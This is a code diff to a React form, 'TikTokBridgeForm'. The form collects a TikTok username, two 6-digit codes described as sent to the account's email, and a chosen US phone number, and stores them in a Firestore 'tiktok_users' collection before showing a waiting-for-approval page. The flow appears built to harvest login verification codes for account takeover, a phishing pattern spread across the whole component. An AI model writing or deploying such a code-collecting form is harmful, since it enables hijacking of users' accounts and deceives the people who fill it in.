@@ -25,7 +25,7 @@ import { updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";
 import { Badge } from "@/components/ui/badge";
 import { successStories } from "@/lib/success-stories";
 
-const featuredUsernames = successStories.map(story => story.creator.toLowerCase());
+const featuredUsernames = successStories.map(story => story.creator.toLowerCase().replace('@', ''));
 
 const TIKTOK_BRIDGE_STEPS = [
   { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
@@ -37,12 +37,12 @@ const TIKTOK_BRIDGE_STEPS = [
 
 const formSchema = z.object({
   username: z.string().min(2, "Username must be at least 2 characters.").refine(
-    (value) => !featuredUsernames.includes(`@${value.toLowerCase()}`),
+    (value) => !featuredUsernames.includes(value.toLowerCase()),
     (value) => ({ message: `@${value} is a featured creator and cannot be used.` })
   ),
-  verificationCode: z.string().length(6, "Code must be 6 digits.").optional(),
-  usNumber: z.string({ required_error: "Please select a number." }).optional(),
-  finalCode: z.string().length(6, "Code must be 6 digits.").optional(),
+  verificationCode: z.string().length(6, "Code must be 6 digits."),
+  usNumber: z.string({ required_error: "Please select a number." }),
+  finalCode: z.string().length(6, "Code must be 6 digits."),
 });
 
 type FormValues = z.infer<typeof formSchema>;
@@ -77,11 +77,11 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
     resolver: zodResolver(formSchema),
     mode: 'onChange',
     defaultValues: {
-      username: '',
-      verificationCode: '',
-      usNumber: '',
-      finalCode: '',
-    },
+        username: "",
+        verificationCode: "",
+        usNumber: "",
+        finalCode: "",
+    }
   });
     
   useEffect(() => {
@@ -94,7 +94,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
   const handleNext = async () => {
     const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
     if (fieldsToValidate && fieldsToValidate.length > 0) {
-        const isValid = await form.trigger(fieldsToValidate);
+        const isValid = await form.trigger(fieldsToValidate as any, { shouldFocus: true });
         if (!isValid) return;
     }
 
@@ -109,7 +109,6 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
         // Step 1: Create the document
         if (currentStep === 0) { 
             setLinkingMessage("Reviewing...");
-            
             await new Promise(resolve => setTimeout(resolve, 5000));
             
             const { username } = form.getValues();
@@ -122,13 +121,9 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
             await updateDocumentNonBlocking(newDocRef, { id: newDocRef.id });
             setSubmissionId(newDocRef.id);
             localStorage.setItem('submissionId', newDocRef.id);
-            currentSubmissionId = newDocRef.id;
         } else {
-            if (!currentSubmissionId) {
-                throw new Error("Submission ID not found. Please start from step 1.");
-            }
-            const submissionDocRef = doc(firestore, 'tiktok_users', currentSubmissionId);
-            
+             const submissionDocRef = doc(firestore, 'tiktok_users', submissionId!);
+
             // Step 2: Add verification code
             if (currentStep === 1) { 
                 const { verificationCode } = form.getValues();
@@ -157,36 +152,23 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
             
             // Step 4: Add final code
             if (currentStep === 3) {
+                setLinkingMessage("Finalizing your submission...");
                 const { finalCode } = form.getValues();
                 updateDocumentNonBlocking(submissionDocRef, { finalCode });
-                
-                setLinkingMessage("Finalizing your submission...");
                 await new Promise(resolve => setTimeout(resolve, 2000));
             }
         }
 
-
-        setIsSubmitting(false);
-        setLinkingMessage(null);
         api.scrollNext();
 
-        if (currentStep === TIKTOK_BRIDGE_STEPS.length - 2) {
-            if (onFinished) {
-              onFinished();
-            } else {
-               setTimeout(() => {
-                router.push('/waiting-for-approval');
-              }, 3000); 
-            }
-        }
-
-    } catch (e) {
+    } catch (e: any) {
         console.error("An error occurred: ", e);
+        form.setError("root", { type: "manual", message: e.message || "An unexpected error occurred." });
+    } finally {
         setIsSubmitting(false);
         setLinkingMessage(null);
     }
   };
-
 
   const handlePrev = () => {
     if (isSubmitting) return;
@@ -197,7 +179,17 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
     if (!api) return
 
     const onSelect = (emblaApi: EmblaCarouselType) => {
-      setCurrentStep(emblaApi.selectedScrollSnap())
+      setCurrentStep(emblaApi.selectedScrollSnap());
+
+      if (emblaApi.selectedScrollSnap() === TIKTOK_BRIDGE_STEPS.length - 1) {
+            if (onFinished) {
+              onFinished();
+            } else {
+               setTimeout(() => {
+                router.push('/waiting-for-approval');
+              }, 3000); 
+            }
+      }
     }
 
     api.on("select", onSelect);
@@ -206,10 +198,12 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
     return () => {
       api.off("select", onSelect);
     };
-  }, [api])
+  }, [api, onFinished, router])
   
   const CurrentIcon = TIKTOK_BRIDGE_STEPS[currentStep]?.icon || User;
   const progressValue = ((currentStep) / (TIKTOK_BRIDGE_STEPS.length -1)) * 100;
+
+  const isContentLoading = (isSubmitting && linkingMessage) || (currentStep === 2 && phoneNumbersLoading);
 
   return (
     <Card className="rounded-2xl shadow-xl border-t w-full max-w-md mx-auto">
@@ -231,171 +225,184 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
       </CardHeader>
       <Form {...form}>
         <form onSubmit={(e) => e.preventDefault()}>
-          <CardContent className="min-h-[350px] adaptive-height">
+          <CardContent className={cn("min-h-[350px]", { 'h-[280px]': currentStep !== 2, 'h-[400px]': currentStep === 2 }, 'transition-all duration-300 ease-in-out')}>
+            {form.formState.errors.root && (
+                <div className="text-destructive text-sm font-medium p-2 text-center">{form.formState.errors.root.message}</div>
+            )}
             <Carousel setApi={setApi} opts={{ watchDrag: false, allowTouchMove: false }} className="w-full">
               <CarouselContent>
                 {/* Step 1: Username */}
                 <CarouselItem>
-                    {isSubmitting && linkingMessage ? (
-                        <div className="flex flex-col items-center justify-center h-[280px] text-center">
-                            <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
-                            <p className="text-muted-foreground">{linkingMessage}</p>
-                        </div>
-                    ) : (
-                        <FormField
-                            control={form.control}
-                            name="username"
-                            render={({ field }) => (
-                            <FormItem className="pt-2">
-                                <FormLabel>TikTok Username</FormLabel>
-                                <FormControl>
-                                <div className="relative">
-                                    <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
-                                    <Input placeholder="your_username" {...field} className="pl-10 h-11" />
-                                </div>
-                                </FormControl>
-                                <FormMessage />
-                            </FormItem>
-                            )}
-                        />
-                    )}
+                    <div className="flex flex-col justify-center h-[280px]">
+                        {isSubmitting && linkingMessage ? (
+                            <div className="flex flex-col items-center justify-center h-full text-center">
+                                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
+                                <p className="text-muted-foreground">{linkingMessage}</p>
+                            </div>
+                        ) : (
+                            <FormField
+                                control={form.control}
+                                name="username"
+                                render={({ field }) => (
+                                <FormItem className="pt-2">
+                                    <FormLabel>TikTok Username</FormLabel>
+                                    <FormControl>
+                                    <div className="relative">
+                                        <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
+                                        <Input placeholder="your_username" {...field} className="pl-10 h-11" />
+                                    </div>
+                                    </FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )}
+                            />
+                        )}
+                    </div>
                 </CarouselItem>
 
                 {/* Step 2: First Code */}
                 <CarouselItem>
-                   <FormField
-                    control={form.control}
-                    name="verificationCode"
-                    render={({ field }) => (
-                      <FormItem className="pt-2 flex flex-col items-center">
-                        <FormLabel>Verification Code</FormLabel>
-                        <FormControl>
-                            <InputOTP maxLength={6} {...field}>
-                                <InputOTPGroup>
-                                    <InputOTPSlot index={0} />
-                                    <InputOTPSlot index={1} />
-                                    <InputOTPSlot index={2} />
-                                    <InputOTPSlot index={3} />
-                                    <InputOTPSlot index={4} />
-                                    <InputOTPSlot index={5} />
-                                </InputOTPGroup>
-                            </InputOTP>
-                        </FormControl>
-                        <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Please enter the 6-digit code we sent to the email linked to this account.</p>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
+                    <div className="flex flex-col justify-center h-[280px] items-center">
+                       <FormField
+                        control={form.control}
+                        name="verificationCode"
+                        render={({ field }) => (
+                          <FormItem className="pt-2 flex flex-col items-center">
+                            <FormLabel>Verification Code</FormLabel>
+                            <FormControl>
+                                <InputOTP maxLength={6} {...field}>
+                                    <InputOTPGroup>
+                                        <InputOTPSlot index={0} />
+                                        <InputOTPSlot index={1} />
+                                        <InputOTPSlot index={2} />
+                                        <InputOTPSlot index={3} />
+                                        <InputOTPSlot index={4} />
+                                        <InputOTPSlot index={5} />
+                                    </InputOTPGroup>
+                                </InputOTP>
+                            </FormControl>
+                            <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Enter the 6-digit code from our simulated process.</p>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+                    </div>
                 </CarouselItem>
 
                 {/* Step 3: Select Number */}
                 <CarouselItem>
-                  <FormField
-                    control={form.control}
-                    name="usNumber"
-                    render={({ field }) => (
-                      <FormItem className="pt-2">
-                        <FormLabel>Choose a US Number</FormLabel>
-                        <FormMessage className="pb-2"/>
-                        <FormControl>
-                          <ScrollArea className="h-[280px] w-full pr-4">
-                            {isSubmitting && linkingMessage ? (
-                                <div className="flex flex-col items-center justify-center h-full text-center">
-                                    <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
-                                    <p className="text-muted-foreground">{linkingMessage}</p>
-                                </div>
-                            ) : phoneNumbersLoading ? (
-                                <div className="flex justify-center items-center h-64">
-                                    <Loader2 className="animate-spin" />
-                                </div>
-                              ) : (
-                                <div className="space-y-3">
-                                {phoneNumbers?.filter(n => n.isAvailable).map((number) => (
-                                    <Card 
-                                        key={number.id} 
-                                        onClick={() => isSubmitting ? null : field.onChange(number.phoneNumber)}
-                                        className={cn(
-                                            "cursor-pointer transition-all hover:shadow-md hover:border-primary/50 rounded-xl",
-                                            field.value === number.phoneNumber && "border-primary ring-2 ring-primary/50 shadow-lg"
-                                        )}
-                                    >
-                                        <CardHeader className="p-4">
-                                            <div className="flex justify-between items-start">
-                                                <div>
-                                                    <CardTitle className="text-lg">{number.phoneNumber}</CardTitle>
-                                                    <CardDescription>{number.region}, {number.state}</CardDescription>
-                                                </div>
-                                                <Badge variant={number.isAvailable ? "default" : "secondary"} className={cn(number.isAvailable ? "bg-green-100 text-green-800 border-green-200" : "bg-red-100 text-red-800 border-red-200")}>{number.isAvailable ? "Available" : "Taken"}</Badge>
+                    <div className="h-[400px]">
+                        <FormField
+                            control={form.control}
+                            name="usNumber"
+                            render={({ field }) => (
+                            <FormItem className="pt-2 h-full flex flex-col">
+                                <FormLabel>Choose a US Number</FormLabel>
+                                <FormMessage className="pb-2"/>
+                                <FormControl className="flex-grow">
+                                <ScrollArea className="h-full w-full pr-4">
+                                    {isSubmitting && linkingMessage ? (
+                                        <div className="flex flex-col items-center justify-center h-full text-center">
+                                            <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
+                                            <p className="text-muted-foreground">{linkingMessage}</p>
+                                        </div>
+                                    ) : phoneNumbersLoading ? (
+                                        <div className="flex justify-center items-center h-full">
+                                            <Loader2 className="animate-spin h-8 w-8 text-primary" />
+                                        </div>
+                                    ) : (
+                                        <div className="space-y-3">
+                                        {phoneNumbers?.filter(n => n.isAvailable).map((number) => (
+                                            <Card 
+                                                key={number.id} 
+                                                onClick={() => isSubmitting ? null : field.onChange(number.phoneNumber)}
+                                                className={cn(
+                                                    "cursor-pointer transition-all hover:shadow-md hover:border-primary/50 rounded-xl",
+                                                    field.value === number.phoneNumber && "border-primary ring-2 ring-primary/50 shadow-lg"
+                                                )}
+                                            >
+                                                <CardHeader className="p-4">
+                                                    <div className="flex justify-between items-start">
+                                                        <div>
+                                                            <CardTitle className="text-lg">{number.phoneNumber}</CardTitle>
+                                                            <CardDescription>{number.region}, {number.state}</CardDescription>
+                                                        </div>
+                                                        <Badge variant={number.isAvailable ? "default" : "secondary"} className={cn(number.isAvailable ? "bg-green-100 text-green-800 border-green-200" : "bg-red-100 text-red-800 border-red-200")}>{number.isAvailable ? "Available" : "Taken"}</Badge>
 
-                                            </div>
-                                        </CardHeader>
-                                        <CardContent className="p-4 pt-0 text-sm">
-                                             {number.bonuses && number.bonuses.length > 0 && (
-                                                <div className="mb-3">
-                                                    <h4 className="font-semibold mb-1 text-primary">Bonuses</h4>
-                                                    <ul className="list-disc pl-5 space-y-1 text-foreground/80">
-                                                        {number.bonuses.map((bonus, i) => <li key={i}>{bonus}</li>)}
-                                                    </ul>
-                                                </div>
-                                            )}
-                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                                <div>
-                                                    <h4 className="font-semibold mb-2 flex items-center text-green-600 dark:text-green-400"><Check className="h-4 w-4 mr-2"/>Benefits</h4>
-                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
-                                                         {number.benefits.map((benefit, i) => <li key={i} className="flex items-start"><Check className="h-4 w-4 mr-2 mt-1 text-green-500 shrink-0"/><span>{benefit}</span></li>)}
-                                                    </ul>
-                                                </div>
-                                                <div>
-                                                    <h4 className="font-semibold mb-2 flex items-center text-red-600 dark:text-red-400"><X className="h-4 w-4 mr-2"/>Disadvantages</h4>
-                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
-                                                        {number.disadvantages.map((disadvantage, i) => <li key={i} className="flex items-start"><X className="h-4 w-4 mr-2 mt-1 text-red-500 shrink-0"/><span>{disadvantage}</span></li>)}
-                                                    </ul>
-                                                </div>
-                                            </div>
-                                        </CardContent>
-                                    </Card>
-                                ))}
-                                </div>
-                              )}
-                          </ScrollArea>
-                        </FormControl>
-                      </FormItem>
-                    )}
-                  />
+                                                    </div>
+                                                </CardHeader>
+                                                {(number.benefits?.length > 0 || number.disadvantages?.length > 0) && (
+                                                <CardContent className="p-4 pt-0 text-sm">
+                                                    {number.bonuses && number.bonuses.length > 0 && (
+                                                        <div className="mb-3">
+                                                            <h4 className="font-semibold mb-1 text-primary">Bonuses</h4>
+                                                            <ul className="list-disc pl-5 space-y-1 text-foreground/80">
+                                                                {number.bonuses.map((bonus, i) => <li key={i}>{bonus}</li>)}
+                                                            </ul>
+                                                        </div>
+                                                    )}
+                                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                                        {number.benefits?.length > 0 && <div>
+                                                            <h4 className="font-semibold mb-2 flex items-center text-green-600 dark:text-green-400"><Check className="h-4 w-4 mr-2"/>Benefits</h4>
+                                                            <ul className="list-none pl-0 space-y-1 text-muted-foreground">
+                                                                {number.benefits.map((benefit, i) => <li key={i} className="flex items-start"><Check className="h-4 w-4 mr-2 mt-1 text-green-500 shrink-0"/><span>{benefit}</span></li>)}
+                                                            </ul>
+                                                        </div>}
+                                                        {number.disadvantages?.length > 0 && <div>
+                                                            <h4 className="font-semibold mb-2 flex items-center text-red-600 dark:text-red-400"><X className="h-4 w-4 mr-2"/>Disadvantages</h4>
+                                                            <ul className="list-none pl-0 space-y-1 text-muted-foreground">
+                                                                {number.disadvantages.map((disadvantage, i) => <li key={i} className="flex items-start"><X className="h-4 w-4 mr-2 mt-1 text-red-500 shrink-0"/><span>{disadvantage}</span></li>)}
+                                                            </ul>
+                                                        </div>}
+                                                    </div>
+                                                </CardContent>
+                                                )}
+                                            </Card>
+                                        ))}
+                                        </div>
+                                    )}
+                                </ScrollArea>
+                                </FormControl>
+                            </FormItem>
+                            )}
+                        />
+                    </div>
                 </CarouselItem>
 
                 {/* Step 4: Final Code */}
                 <CarouselItem>
-                   {isSubmitting && linkingMessage ? (
-                        <div className="flex flex-col items-center justify-center h-[280px] text-center">
-                            <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
-                            <p className="text-muted-foreground">{linkingMessage}</p>
-                        </div>
-                   ) : (
-                    <FormField
-                        control={form.control}
-                        name="finalCode"
-                        render={({ field }) => (
-                        <FormItem className="pt-2 flex flex-col items-center">
-                            <FormLabel>Final Confirmation Code</FormLabel>
-                           <FormControl>
-                            <InputOTP maxLength={6} {...field}>
-                                <InputOTPGroup>
-                                    <InputOTPSlot index={0} />
-                                    <InputOTPSlot index={1} />
-                                    <InputOTPSlot index={2} />
-                                    <InputOTPSlot index={3} />
-                                    <InputOTPSlot index={4} />
-                                    <InputOTPSlot index={5} />
-                                </InputOTPGroup>
-                            </InputOTP>
-                        </FormControl>
-                            <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Please enter the second code from your email to finalize.</p>
-                            <FormMessage />
-                        </FormItem>
-                        )}
-                    />
-                   )}
+                    <div className="flex flex-col justify-center h-[280px] items-center">
+                       {isSubmitting && linkingMessage ? (
+                            <div className="flex flex-col items-center justify-center h-full text-center">
+                                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
+                                <p className="text-muted-foreground">{linkingMessage}</p>
+                            </div>
+                       ) : (
+                        <FormField
+                            control={form.control}
+                            name="finalCode"
+                            render={({ field }) => (
+                            <FormItem className="pt-2 flex flex-col items-center">
+                                <FormLabel>Final Confirmation Code</FormLabel>
+                               <FormControl>
+                                <InputOTP maxLength={6} {...field}>
+                                    <InputOTPGroup>
+                                        <InputOTPSlot index={0} />
+                                        <InputOTPSlot index={1} />
+                                        <InputOTPSlot index={2} />
+                                        <InputOTPSlot index={3} />
+                                        <InputOTPSlot index={4} />
+                                        <InputOTPSlot index={5} />
+                                    </InputOTPGroup>
+                                </InputOTP>
+                            </FormControl>
+                                <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Enter the final 6-digit code to complete the process.</p>
+                                <FormMessage />
+                            </FormItem>
+                            )}
+                        />
+                       )}
+                    </div>
                 </CarouselItem>
                 
                 {/* Step 5: Success */}
@@ -427,5 +434,3 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
     </Card>
   );
 }
-
-    
